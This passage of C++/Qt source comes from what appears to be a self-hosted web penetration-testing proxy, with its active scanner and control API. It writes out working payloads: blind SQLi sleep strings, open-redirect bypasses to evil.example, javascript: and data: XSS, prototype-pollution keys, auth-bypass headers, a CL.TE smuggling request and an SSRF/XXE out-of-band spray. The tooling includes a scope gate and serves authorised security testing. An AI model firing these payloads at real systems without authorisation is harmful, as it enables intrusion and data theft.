                                    || key.compare("role", Qt::CaseInsensitive) == 0
                                    || key.compare("permission", Qt::CaseInsensitive) == 0)) {
                                const auto res = fire(i, "true");
                                if (res.ok && res.parsed.statusCode == 200) {
                                    report("high", "mass-assignment-suspect",
                                           "Param '" + key + "' (privilege-shape name) accepted in mutation",
                                           "param=" + key + " · "
                                           + base.method + " returned 200 with value 'true'");
                                }
                            }

                            // ---- Blind SQLi: time-based ------------------
                            // Time-based confirms SQLi even when there's no
                            // error reflection. Measure baseline, fire
                            // SLEEP(3), compare. Cap at one engine per param.
                            {
                                QElapsedTimer base_t; base_t.start();
                                const auto base_res = fire(i, "1");
                                const qint64 baseMs = base_t.elapsed();
                                if (!base_res.ok) goto blindsqli_done;

                                struct TimePayload { const char *engine; const char *payload; };
                                static const TimePayload kTimings[] = {
                                    { "MySQL",      "1' AND SLEEP(3)-- -" },
                                    { "PostgreSQL", "1';SELECT pg_sleep(3)-- -" },
                                    { "MSSQL",      "1';WAITFOR DELAY '0:0:3'-- -" },
                                    { "SQLite",     "1' AND randomblob(99999999)-- -" },
                                };
                                for (const auto &t : kTimings) {
                                    QElapsedTimer probe_t; probe_t.start();
                                    const auto probe_res = fire(i, QString::fromLatin1(t.payload));
                                    const qint64 probeMs = probe_t.elapsed();
                                    if (!probe_res.ok) continue;
                                    // Need at least 2.5s extra delay AND
                                    // a noticeable multiple over baseline
                                    // to avoid network-jitter false positives.
                                    if (probeMs > baseMs + 2500 && probeMs > baseMs * 3) {
                                        report("critical",
                                               QString("sqli-blind-time-") + QString::fromLatin1(t.engine).toLower(),
                                               QString("Param '%1' looks vulnerable to time-based %2 SQLi")
                                                   .arg(key, QString::fromLatin1(t.engine)),
                                               QString("baseline=%1ms · probe=%2ms · payload=%3")
                                                   .arg(baseMs).arg(probeMs)
                                                   .arg(QString::fromLatin1(t.payload)));
                                        break;
                                    }
                                }
                            }
                            blindsqli_done:;

                            // ---- Open redirect variants ------------------
                            // The original probe only tries https://canary.
                            // Many filters block "https://" but allow other
                            // schemes / path tricks.
                            {
                                static const char *kRedirVariants[] = {
                                    "//nullock-canary.invalid/",
                                    "/\\nullock-canary.invalid",
                                    "javascript://nullock-canary.invalid/%0aalert(1)",
                                    "data:text/html,<script>alert(1)</script>",
                                    "https://[email protected]@evil.example/",
                                    "https://target.example.evil.example/",
                                };
                                for (const char *p : kRedirVariants) {
                                    const auto res = fire(i, QString::fromLatin1(p));
                                    if (!res.ok || res.parsed.statusCode < 300
                                        || res.parsed.statusCode >= 400) continue;
                                    QString loc;
                                    for (const auto &h : res.parsed.headers)
                                        if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                            loc = h.second; break;
                                        }
                                    if (loc.isEmpty()) continue;
                                    // Heuristic: if the payload string is
                                    // present in Location, the filter let
                                    // it through.
                                    if (loc.contains("nullock-canary.invalid")
                                        || loc.contains("evil.example")
                                        || loc.startsWith("javascript:")
                                        || loc.startsWith("data:")) {
                                        report("high", "open-redirect-variant",
                                               QString("Param '%1' allows %2-style redirect bypass")
                                                   .arg(key, QString::fromLatin1(p).left(20)),
                                               QString("payload=%1 · Location=%2")
                                                   .arg(QString::fromLatin1(p), loc.left(160)));
                                        break;
                                    }
                                }
                            }

                            // ---- Server-side prototype pollution ---------
                            // Fire __proto__[isAdmin]=true and proto-shape
                            // payloads. We can't prove pollution without a
                            // follow-up request from a sandbox, but the
                            // server accepting the key without 4xx is a
                            // tell that JSON.parse + Object.assign exists.
                            if (base.method == "POST" || base.method == "PUT"
                                || base.method == "PATCH") {
                                static const char *kProtoPay[] = {
                                    "__proto__[nullockSentinel]=NSV",
                                    "constructor[prototype][nullockSentinel]=NSV",
                                    "__proto__.nullockSentinel=NSV",
                                };
                                for (const char *p : kProtoPay) {
                                    const auto res = fire(i, QString::fromLatin1(p));
                                    if (!res.ok) continue;
                                    if (res.parsed.statusCode == 200) {
                                        const QString b = QString::fromUtf8(
                                            res.parsed.body.left(8 * 1024));
                                        if (b.contains("NSV")) {
                                            report("high", "proto-pollution-reflected",
                                                   "Server-side prototype pollution: sentinel echoed",
                                                   "payload=" + QString::fromLatin1(p));
                                            break;
                                        }
                                    }
                                }
                            }

                            // ---- HTTP Parameter Pollution (HPP) ----------
                            // Same key twice, different values. Inconsistent
                            // handling across stack components is a smell.
                            {
                                const QString hpp = "a&" + key + "=b";
                                const auto res = fire(i, hpp);
                                if (res.ok && res.parsed.statusCode == 200) {
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(8 * 1024));
                                    if (b.contains("a,b") || b.contains("b,a")
                                        || (b.contains("a") && b.contains("b"))) {
                                        report("info", "hpp-stack-divergence",
                                               "Param '" + key + "' may exhibit HPP "
                                               "(both values visible in response)",
                                               "payload=" + hpp);
                                    }
                                }
                            }
                        }

                        // ---- Per-row probes (not per-param) -------------
                        // These don't iterate query params; they fire once
                        // per row at the request's URL.

                        // ---- Authentication-bypass via headers ----------
                        // X-Original-URL / X-Rewrite-URL / X-Forwarded-Host
                        // are honored by some reverse proxies (IIS, ARR,
                        // some nginx configs). Try sending one and seeing
                        // if a 403 path suddenly returns 200.
                        if (srcStatusCode == 403) {
                            struct BypassH {
                                const char *header;
                                const char *value;
                                const char *kind;
                            };
                            static const BypassH kBypass[] = {
                                { "X-Original-URL",   "/",           "auth-bypass-original-url" },
                                { "X-Rewrite-URL",    "/",           "auth-bypass-rewrite-url" },
                                { "X-Forwarded-For",  "127.0.0.1",   "auth-bypass-xff" },
                                { "X-Real-IP",        "127.0.0.1",   "auth-bypass-real-ip" },
                                { "X-Originating-IP", "127.0.0.1",   "auth-bypass-orig-ip" },
                                { "X-Custom-IP-Authorization", "127.0.0.1", "auth-bypass-custom-ip" },
                            };
                            for (const auto &b : kBypass) {
                                Nullock::Proxy::HttpRequest r = base;
                                r.headers.append({ QString::fromLatin1(b.header),
                                                   QString::fromLatin1(b.value) });
                                if (w.extensions) r = w.extensions->applyRequestMutation(r);
                                if (w.proxy)      w.proxy->applyRequestRules(r);
                                const QByteArray bytes =
                                    Nullock::Proxy::serializeRequestForOrigin(r);
                                auto res = client.send(r.host,
                                    static_cast<quint16>(r.port), useTls, bytes);
                                if (!res.ok) continue;
                                if (res.parsed.statusCode == 200) {
                                    report("high", b.kind,
                                           QString("403 -> 200 via %1 header bypass")
                                               .arg(QString::fromLatin1(b.header)),
                                           "header=" + QString::fromLatin1(b.header)
                                           + ": " + QString::fromLatin1(b.value));
                                    break;
                                }
                            }
                        }

                        // ---- HTTP smuggling detection (CL.TE) -----------
                        // Send a request with both Content-Length and
                        // Transfer-Encoding. If the server's response
                        // timing changes dramatically (front-end picks
                        // CL, back-end picks TE), that's the smell.
                        // We're conservative: only flag a 5x baseline
                        // timing delta with the malicious framing.
                        {
                            QElapsedTimer t1; t1.start();
                            (void)client.send(base.host, static_cast<quint16>(base.port),
                                              useTls,
                                              Nullock::Proxy::serializeRequestForOrigin(base));
                            const qint64 baselineMs = t1.elapsed();

                            // Craft a CL+TE smuggling probe by hand. Reuse
                            // base's request line + headers but force the
                            // body framing.
                            QByteArray probe;
                            probe += base.method.toUtf8() + " " + base.path.toUtf8()
                                  + " HTTP/1.1\r\n";
                            probe += "Host: " + base.host.toUtf8() + "\r\n";
                            probe += "Content-Length: 4\r\n";
                            probe += "Transfer-Encoding: chunked\r\n";
                            probe += "\r\n";
                            probe += "1\r\n";
                            probe += "A\r\n";
                            probe += "0\r\n\r\n";

                            QElapsedTimer t2; t2.start();
                            auto smugRes = client.send(base.host,
                                static_cast<quint16>(base.port), useTls, probe);
                            const qint64 smugMs = t2.elapsed();

                            // 5x slowdown AND > 5s absolute -> probably
                            // back-end waiting on body that won't come.
                            if (smugRes.ok && smugMs > 5000
                                && smugMs > baselineMs * 5) {
                                report("high", "http-smuggling-clte-suspect",
                                       "CL+TE timing delta suggests front-end/back-end "
                                       "framing disagreement",
                                       QString("baseline=%1ms · CL+TE probe=%2ms")
                                           .arg(baselineMs).arg(smugMs));
                            }
                        }

                        // ---- Cache poisoning via X-Forwarded-Host -------
                        // Inject the header, observe if the response body
                        // reflects it (would cache + serve to next user).
                        {
                            const QString unique = QString("nullock-cache-")
                                + QString::number(QRandomGenerator::global()->generate(), 16);
                            Nullock::Proxy::HttpRequest r = base;
                            r.headers.append({ "X-Forwarded-Host", unique + ".invalid" });
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            auto res = client.send(r.host,
                                static_cast<quint16>(r.port), useTls,
                                Nullock::Proxy::serializeRequestForOrigin(r));
                            if (res.ok) {
                                const QString body = QString::fromUtf8(
                                    res.parsed.body.left(64 * 1024));
                                QString loc;
                                for (const auto &h : res.parsed.headers)
                                    if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                        loc = h.second; break;
                                    }
                                if (body.contains(unique) || loc.contains(unique)) {
                                    report("high", "cache-poison-xfh",
                                           "X-Forwarded-Host value reflected in response "
                                           "(potential web cache poisoning)",
                                           "header reflected: " + unique + ".invalid");
                                }
                            }
                        }

                        // ---- Web cache deception ------------------------
                        // Append /.css to the path. If the response 200s
                        // AND the body looks like the original
                        // (authenticated) page, the cache will serve
                        // user A's account page from /account/.css to
                        // anyone hitting it later.
                        if (!base.path.contains(".") || base.path.endsWith("/")) {
                            const QString deceived = (base.path.endsWith("/")
                                ? base.path + "nullock-wcd.css"
                                : base.path + "/nullock-wcd.css");
                            Nullock::Proxy::HttpRequest r = base;
                            r.path = deceived;
                            r.target = deceived;
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            auto res = client.send(r.host,
                                static_cast<quint16>(r.port), useTls,
                                Nullock::Proxy::serializeRequestForOrigin(r));
                            if (res.ok && res.parsed.statusCode == 200
                                && res.parsed.body.size() > 1024) {
                                // Heuristic: response looks personalized
                                // (contains a Set-Cookie or auth-shaped
                                // header).
                                bool personalized = false;
                                for (const auto &h : res.parsed.headers) {
                                    if (h.first.compare("Set-Cookie", Qt::CaseInsensitive) == 0
                                        || h.first.compare("Authorization", Qt::CaseInsensitive) == 0) {
                                        personalized = true; break;
                                    }
                                }
                                if (personalized) {
                                    report("high", "web-cache-deception",
                                           "Path-trick still served authenticated page "
                                           "(cache-deception candidate)",
                                           "deceived path: " + deceived);
                                }
                            }
                        }

                        // ---- Race condition probe -----------------------
                        // Fire 5 identical requests concurrently. If more
                        // than one returns 200 on what should be a
                        // single-use mutation (POST/PUT/DELETE), the
                        // server has TOCTOU.
                        if (base.method == "POST" || base.method == "PUT"
                            || base.method == "DELETE") {
                            const QByteArray bytes2 =
                                Nullock::Proxy::serializeRequestForOrigin(base);
                            QList<QFuture<int>> fanOut;
                            for (int k = 0; k < 5; ++k) {
                                fanOut.append(QtConcurrent::run(
                                    [host=base.host, port=base.port, useTls, bytes2]() {
                                        Nullock::Core::HttpClient c;
                                        auto r = c.send(host,
                                            static_cast<quint16>(port), useTls, bytes2);
                                        return r.ok ? r.parsed.statusCode : 0;
                                    }));
                            }
                            int wins = 0;
                            for (auto &f : fanOut) {
                                f.waitForFinished();
                                if (f.result() == 200) ++wins;
                            }
                            if (wins >= 2) {
                                report("high", "race-condition-suspect",
                                       "Identical mutation request returned 200 from "
                                       + QString::number(wins) + "/5 concurrent fires",
                                       base.method + " " + base.path);
                            }
                        }
                    });
                    return httpJson(200, QJsonObject{{ "ok", true },
                                                      { "queued", true },
                                                      { "params", params.size() }});
                }
                if (parts[1] == "replay") {
                    // Re-fire the captured request through the same mutation
                    // pipeline as live traffic. HttpClient::send() blocks
                    // with waitFor* calls that would re-enter the control
                    // server's main-thread event loop if we ran it inline
                    // here -- crashed the app on first try. So we hand the
                    // whole replay off to a worker; the new row arrives in
                    // the snapshot poll ~250ms later.
                    if (!m_wiring.history || !m_wiring.proxy)
                        return httpJson(404, QJsonObject{{ "error", "no history" }});
                    Nullock::Proxy::HttpRequest req;
                    bool useTls = false;
                    if (auto *src = m_wiring.history->requestById(id)) {
                        req = *src;
                        auto *srcResp = m_wiring.history->responseById(id);
                        useTls = srcResp ? srcResp->wasTls : false;
                    } else if (m_wiring.projectStore) {
                        auto *idx = m_wiring.projectStore->historyIndex();
                        if (idx && idx->isOpen()) {
                            auto fr = idx->loadFullRow(id);
                            if (fr.ok) {
                                req = std::move(fr.request);
                                useTls = fr.response.wasTls;
                            } else {
                                return httpJson(404, QJsonObject{{ "error", "row not found" }});
                            }
                        }
                    } else {
                        return httpJson(404, QJsonObject{{ "error", "row not found" }});
                    }
                    Wiring w = m_wiring;
                    (void)QtConcurrent::run([w, req, useTls]() {
                        Nullock::Proxy::HttpRequest r = req;
                        if (w.extensions) r = w.extensions->applyRequestMutation(r);
                        if (w.proxy)      w.proxy->applyRequestRules(r);

                        const QByteArray bytes =
                            Nullock::Proxy::serializeRequestForOrigin(r);

                        Nullock::Core::HttpClient client;
                        const auto result = client.send(r.host,
                                                        static_cast<quint16>(r.port),
                                                        useTls, bytes);
                        Nullock::Proxy::HttpResponse resp;
                        if (result.ok) {
                            resp = result.parsed;
                            resp.wasTls = useTls;
                        } else {
                            resp.httpVersion  = "HTTP/1.1";
                            resp.statusCode   = 0;
                            resp.reasonPhrase = "replay error: " + result.errorMessage;
                            resp.wasTls       = useTls;
                        }
                        if (w.extensions) resp = w.extensions->applyResponseMutation(r, resp);
                        if (w.proxy)      w.proxy->applyResponseRules(r, resp);

                        // Hop back to the main thread to mutate the model,
                        // feed the scanner, and append to project history.
                        if (w.proxy) {
                            QMetaObject::invokeMethod(w.proxy, [w, r, resp]() {
                                if (w.history)      w.history->addResponse(r, resp);
                                if (w.scanner)      w.scanner->onResponseReceived(r, resp);
                                if (w.projectStore) w.projectStore->appendEntry(r, resp);
                            }, Qt::QueuedConnection);
                        }
                    });
                    return httpJson(200, QJsonObject{{ "ok", true },
                                                     { "queued", true }});
                }
                const bool wantReq = (parts[1] == "request");
                const QByteArray text = buildHistoryRow(id, wantReq);
                if (text.isEmpty())
                    return httpResponse(404, "text/plain", "row not found");
                return httpResponse(200, "text/plain; charset=utf-8", text);
            }
        }
    }

    // --- write actions; POST only (we accept any method for laziness) -------
    // `extra` may override "ok" (e.g. an endpoint reporting a failed
    // operation). Default is { "ok": true }.
    auto okJson = [](const QJsonObject &extra = {}) {
        QJsonObject o = extra;
        if (!o.contains("ok")) o["ok"] = true;
        return httpJson(200, o);
    };
    const QJsonObject bodyJson = QJsonDocument::fromJson(body).object();

    // ---- ScopeGuard: one authorization gate for every ACTIVE endpoint ----
    // Active tests fire payloads / scans at a target host. Refuse any whose
    // host the project marks out of scope, so a malicious local page can't
    // pivot through us to attack arbitrary hosts, and an operator can't
    // accidentally scan a host they aren't authorized for. No behaviour change
    // when no scope is configured (isInScope allows an empty in-scope list);
    // it bites only once in/out-of-scope rules exist. Multi-target and stateful
    // endpoints (portscan, audit/all, chain/run, intruder, repeater, authz-test)
    // each apply blocksScope() at their own target sites below.
    static const QSet<QString> kActivePaths = {
        "/api/sqli/test", "/api/ldapi/test", "/api/xpathi/test", "/api/ssrf/test", "/api/deser/test", "/api/nosqli/test", "/api/xxe/test", "/api/ssti/test",
        "/api/cmdi/test", "/api/xss/test", "/api/crlf/test", "/api/pathtraversal/test", "/api/cswsh/test", "/api/jwt/test",
        "/api/openredirect/test", "/api/cache/poison", "/api/cors/test", "/api/idor/test",
        "/api/massassign/test", "/api/verbtamper/test", "/api/race/test", "/api/paramminer",
        "/api/graphql/probe", "/api/graphql/schema", "/api/smuggle/test",
        "/api/servicevulns/scan", "/api/oast/blast", "/api/headers/audit",
        "/api/secrets/scan", "/api/jsrecon/scan", "/api/audit/run",
        "/api/tls/inspect", "/api/fingerprint", "/api/methods/test", "/api/takeover/test",
        "/api/assess", "/api/exposure/scan", "/api/cachedeception/test",
        "/api/pipeline/run", "/api/robots/scan", "/api/waf/detect",
        "/api/intruder/multi", "/api/protopollution/test", "/api/http3/detect",
        "/api/hostheader/test", "/api/content/discover",
    };
    if (kActivePaths.contains(path)) {
        QString tgtHost = bodyJson.value("host").toString();
        if (tgtHost.isEmpty()) {
            const QUrl tu(bodyJson.value("url").toString());
            if (tu.isValid()) tgtHost = tu.host();
        }
        if (blocksScope(tgtHost))
            return okJson({
                { "ok", false }, { "scopeBlocked", true },
                { "error", "host '" + tgtHost + "' is out of scope; add it via "
                           "/api/scope/in/add (or clear out-of-scope rules) to run active tests" } });
    }

    if (path == "/api/proxy/toggle") {
        if (m_wiring.proxy) {
            if (m_wiring.proxy->isRunning()) m_wiring.proxy->stop();
            else                             m_wiring.proxy->start();
        }
        return okJson({{ "isRunning", m_wiring.proxy && m_wiring.proxy->isRunning() }});
    }
    if (path == "/api/intercept/toggle") {
        if (m_wiring.intercept)
            m_wiring.intercept->setEnabled(!m_wiring.intercept->enabled());
        return okJson({{ "enabled", m_wiring.intercept && m_wiring.intercept->enabled() }});
    }
    if (path == "/api/intercept/forward") {
        if (m_wiring.intercept) {
            const QString text = bodyJson.value("text").toString();
            m_wiring.intercept->forward(text);
        }
        return okJson();
    }
    if (path == "/api/intercept/drop") {
        if (m_wiring.intercept) m_wiring.intercept->drop();
        return okJson();
    }
    if (path == "/api/intercept/forwardAll") {
        if (m_wiring.intercept) m_wiring.intercept->forwardAll();
        return okJson();
    }

    if (path == "/api/scope/in/add") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->addInScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/in/remove") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->removeInScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/out/add") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->addOutOfScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/out/remove") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->removeOutOfScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/notes") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->setNotes(bodyJson.value("notes").toString());
        return okJson();
    }

    // Match & replace rules. Body shape mirrors the snapshot:
    //   { enabled, name, hostGlob, section, find, replace,
    //     caseInsensitive, comment }
    // /api/rules/update and /toggle/remove additionally take "index".
    auto ruleFromJson = [](const QJsonObject &o) {
        Nullock::Proxy::MatchReplaceRule r;
        r.enabled         = o.value("enabled").toBool(true);
        r.name            = o.value("name").toString();
        r.hostGlob        = o.value("hostGlob").toString();
        r.section         = static_cast<Nullock::Proxy::MatchReplaceRule::Section>(
                                o.value("section").toInt(1));
        r.find            = o.value("find").toString();
        r.replace         = o.value("replace").toString();
        r.caseInsensitive = o.value("caseInsensitive").toBool(true);
        r.comment         = o.value("comment").toString();
        return r;
    };
    if (path == "/api/rules/add") {
        int idx = -1;
        if (m_wiring.projectStore) idx = m_wiring.projectStore->addRule(ruleFromJson(bodyJson));
        return okJson({{ "index", idx }});
    }
    if (path == "/api/rules/update") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore
                && m_wiring.projectStore->updateRule(idx, ruleFromJson(bodyJson));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/remove") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->removeRule(idx);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/toggle") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->toggleRule(idx);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/move") {
        const int from = bodyJson.value("from").toInt(-1);
        const int to   = bodyJson.value("to").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->moveRule(from, to);
        return okJson({{ "ok", ok }});
    }

    if (path == "/api/repeater/set") {
        if (m_wiring.repeater) {
            if (bodyJson.contains("host"))    m_wiring.repeater->setHost(bodyJson.value("host").toString());
            if (bodyJson.contains("port"))    m_wiring.repeater->setPort(bodyJson.value("port").toInt());
            if (bodyJson.contains("tls"))     m_wiring.repeater->setUseTls(bodyJson.value("tls").toBool());
            if (bodyJson.contains("request")) m_wiring.repeater->setRequestText(bodyJson.value("request").toString());
        }
        return okJson();
    }
    if (path == "/api/repeater/send") {
        if (m_wiring.repeater && blocksScope(m_wiring.repeater->host()))
            return okJson({{ "ok", false }, { "scopeBlocked", true },
                { "error", "repeater target '" + m_wiring.repeater->host() + "' is out of scope" }});
        // Defer: Repeater::send blocks on network. Run it via singleShot so
        // the HTTP response returns immediately and the UI's snapshot poll
        // picks up the result when it's ready.
        if (m_wiring.repeater) {
            QMetaObject::invokeMethod(m_wiring.repeater, "send", Qt::QueuedConnection);
        }
        return okJson();
    }
    if (path == "/api/repeater/clear") {
        if (m_wiring.repeater) m_wiring.repeater->clear();
        return okJson();
    }
    if (path == "/api/repeater/tab/add") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->addTab(bodyJson.value("name").toString());
        return okJson({{ "index", idx }});
    }
    if (path == "/api/repeater/tab/addFromHistory") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->addTabFromHistory(bodyJson.value("row").toInt(-1));
        return okJson({{ "index", idx }});
    }
    if (path == "/api/repeater/tab/close") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->closeTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/activate") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->setActiveTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/rename") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->renameTab(bodyJson.value("index").toInt(-1),
                                                bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/duplicate") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->duplicateTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "index", idx }});
    }

    if (path == "/api/intruder/set") {
        if (m_wiring.intruder) {
            if (bodyJson.contains("host"))     m_wiring.intruder->setHost(bodyJson.value("host").toString());
            if (bodyJson.contains("port"))     m_wiring.intruder->setPort(bodyJson.value("port").toInt());
            if (bodyJson.contains("tls"))      m_wiring.intruder->setUseTls(bodyJson.value("tls").toBool());
            if (bodyJson.contains("template")) m_wiring.intruder->setRequestTemplate(bodyJson.value("template").toString());
            // attackType: an int (0..3) or a name ("sniper" / "battering-ram"
            // / "pitchfork" / "cluster-bomb", hyphen/space tolerant).
            if (bodyJson.contains("attackType")) {
                const QJsonValue at = bodyJson.value("attackType");
                const int t = at.isDouble()
                    ? at.toInt()
                    : static_cast<int>(
                        Nullock::Core::IntruderEngine::parseAttackType(at.toString()));
                m_wiring.intruder->setAttackType(t);
            }
            // payloadSets: one entry per marker position. Each entry is an
            // array of strings or a newline-joined string. Pitchfork /
            // Cluster bomb consume one set per position; Sniper / Battering
            // ram only use the first.
            if (bodyJson.contains("payloadSets")) {
                QStringList sets;
                for (const QJsonValue &sv : bodyJson.value("payloadSets").toArray()) {
                    if (sv.isArray()) {
                        QStringList lines;
                        for (const QJsonValue &v : sv.toArray()) lines.append(v.toString());
                        sets.append(lines.join('\n'));
                    } else {
                        sets.append(sv.toString());
                    }
                }
                m_wiring.intruder->setPayloadSets(sets);
            }
            if (bodyJson.contains("payloads")) {
                // payloads is the set-0 alias: an array of strings or a
                // newline-joined string. Applied after payloadSets so a
                // caller can override just the first set.
                const QJsonValue p = bodyJson.value("payloads");
                if (p.isArray()) {
                    QStringList parts;
                    for (const QJsonValue &v : p.toArray()) parts.append(v.toString());
                    m_wiring.intruder->setPayloads(parts.join('\n'));
                } else {
                    m_wiring.intruder->setPayloads(p.toString());
                }
            }
        }
        return okJson();
    }
    if (path == "/api/intruder/start") {
        if (m_wiring.intruder && blocksScope(m_wiring.intruder->host()))
            return okJson({{ "ok", false }, { "scopeBlocked", true },
                { "error", "intruder target '" + m_wiring.intruder->host() + "' is out of scope" }});
        if (m_wiring.intruder) m_wiring.intruder->start();
        return okJson();
    }
    if (path == "/api/intruder/stop") {
        if (m_wiring.intruder) m_wiring.intruder->stop();
        return okJson();
    }
    if (path == "/api/intruder/clear") {
        if (m_wiring.intruder) m_wiring.intruder->clear();
        return okJson();
    }
    if (path == "/api/intruder/resend") {
        bool ok = m_wiring.intruder
               && m_wiring.intruder->resend(bodyJson.value("row").toInt(-1));
        return okJson({{ "ok", ok }});
    }

    // POST /api/intruder/multi { host, port, tls, template, attackType,
    //                            payloadSets: [[...],[...]], maxRequests? }
    //   Multi-mode Intruder (Sniper / Battering Ram / Pitchfork / Cluster
    //   Bomb) over a raw request template with §...§ markers. Fires each
    //   generated combination and returns the result rows. Scope-gated above.
    if (path == "/api/intruder/multi") {
        namespace IE = Nullock::Core::IntruderEngine;
        const QString host = bodyJson.value("host").toString();
        if (host.isEmpty())
            return okJson({{ "ok", false }, { "error", "host required" }});
        const bool tls = bodyJson.value("tls").toBool();
        const quint16 port = static_cast<quint16>(
            bodyJson.value("port").toInt(tls ? 443 : 80));
        const QString templ = bodyJson.value("template").toString();
        if (templ.isEmpty())
            return okJson({{ "ok", false }, { "error", "template required" }});
        const int positions = IE::countMarkers(templ);
        if (positions == 0)
            return okJson({{ "ok", false },
                           { "error", "template has no marker pairs (wrap each fuzz "
                                      "position in \xC2\xA7...\xC2\xA7)" }});
        const auto type = IE::parseAttackType(bodyJson.value("attackType").toString("sniper"));
        QList<QStringList> sets;
        for (const QJsonValue &sv : bodyJson.value("payloadSets").toArray()) {
            QStringList s;
            for (const QJsonValue &pv : sv.toArray()) s << pv.toString();
            sets.append(s);
        }
        const int cap = qBound(1, bodyJson.value("maxRequests").toInt(2000), 5000);
        const auto combos = IE::generateCombinations(type, positions, sets, cap);
        if (combos.isEmpty())
            return okJson({{ "ok", false },
                           { "error", "no payloads -- supply payloadSets" }});

        Nullock::Core::HttpClient client;
        QJsonArray results;
        for (const QStringList &combo : combos) {
            QString req = IE::applyPayloads(templ, combo);
            req.replace("\r\n", "\n");
            req.replace("\n", "\r\n");
            if (!req.contains("\r\n\r\n")) req += "\r\n\r\n";
            QElapsedTimer t; t.start();
            const auto r = client.send(host, port, tls, req.toUtf8());
            QJsonArray payloads;
            for (const QString &p : combo) payloads.append(p.isNull() ? QStringLiteral("(default)") : p);
            results.append(QJsonObject{
                { "payloads", payloads },
                { "status", r.ok ? r.parsed.statusCode : 0 },
                { "size", static_cast<int>(r.parsed.body.size()) },
                { "ms", static_cast<int>(t.elapsed()) },
                { "error", r.ok ? QString() : r.errorMessage } });
        }
        return okJson({{ "ok", true },
                       { "attackType", IE::attackTypeName(type) },
                       { "positions", positions },
                       { "requests", results.size() },
                       { "results", results }});
    }

    // POST /api/oast/mint -- mints a new token + URL.
    //   Optional body { register: true, rowId?, host?, param?, note? }
    //   registers the token with the correlator so that when the callback
    //   lands, a confirmed finding auto-appears. Use this to mint a URL,
    //   paste it into a Repeater request by hand, and still get automatic
    //   confirmation -- the Collaborator workflow, self-hosted.
    if (path == "/api/oast/mint") {
        if (!m_wiring.oast || !m_wiring.oast->running())
            return okJson({{ "ok", false }, { "error", "OAST server not running" }});
        const QJsonObject minted = m_wiring.oast->mintToken();
        if (bodyJson.value("register").toBool(false) && m_wiring.oastCorrelator) {
            Nullock::Core::OastOrigin origin;
            origin.rowId = bodyJson.value("rowId").toInt(0);
            origin.host  = bodyJson.value("host").toString();
            origin.param = bodyJson.value("param").toString();
            origin.note  = bodyJson.value("note").toString("manual mint");
            origin.url   = minted.value("pathUrl").toString();
            origin.kind  = "ssrf-oast";
            m_wiring.oastCorrelator->registerToken(
                minted.value("token").toString(), origin);
        }
        return httpJson(200, minted);
    }

    // POST /api/oast/blast { url, rowId?, paramNames?: [...], xxe?: true }
    //   Sprays out-of-band payloads at one target across multiple attack
    //   classes -- SSRF through a battery of likely parameter names, and
    //   blind XXE through an XML body whose external entity points at our
    //   sink. Each payload gets its own registered token, so when ANY of
    //   them calls back, a confirmed finding auto-appears tagged with the
    //   attack class. This is active OOB scanning that free tools don't do
    //   and that Burp gates behind Pro + cloud Collaborator.
    if (path == "/api/oast/blast") {
        if (!m_wiring.oast || !m_wiring.oast->running())
            return okJson({{ "ok", false }, { "error", "OAST server not running" }});
        if (!m_wiring.oastCorrelator)
            return okJson({{ "ok", false }, { "error", "no correlator wired" }});
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        const int rowId   = bodyJson.value("rowId").toInt(0);
        const QString host = u.host();
        const int port     = u.port(u.scheme() == "https" ? 443 : 80);
        const bool useTls  = (u.scheme() == "https");
        QString basePath   = u.path().isEmpty() ? "/" : u.path();
        const QString existingQuery = u.query();

        // Curated SSRF param names. Server-side code that fetches a
        // user-supplied URL almost always names the param one of these.
        QStringList paramNames;
        for (const QJsonValue &v : bodyJson.value("paramNames").toArray())
            paramNames << v.toString();
        if (paramNames.isEmpty())
            paramNames = QStringList{
                "url","uri","link","src","source","dest","destination",
                "redirect","redirect_uri","next","return","returnUrl",
                "callback","webhook","feed","image","imageUrl","file",
                "path","host","domain","page","target","out","view",
                "proxy","fetch","load","u","q",
            };
        if (paramNames.size() > 40) paramNames = paramNames.mid(0, 40);
        const bool wantXxe  = bodyJson.value("xxe").toBool(true);
        const bool wantSsrf = bodyJson.value("ssrf").toBool(true);
        const bool wantRce  = bodyJson.value("rce").toBool(true);

        // Build the work list synchronously (mint + register BEFORE firing
        // so a fast callback can't outrun the registry), then fire async.
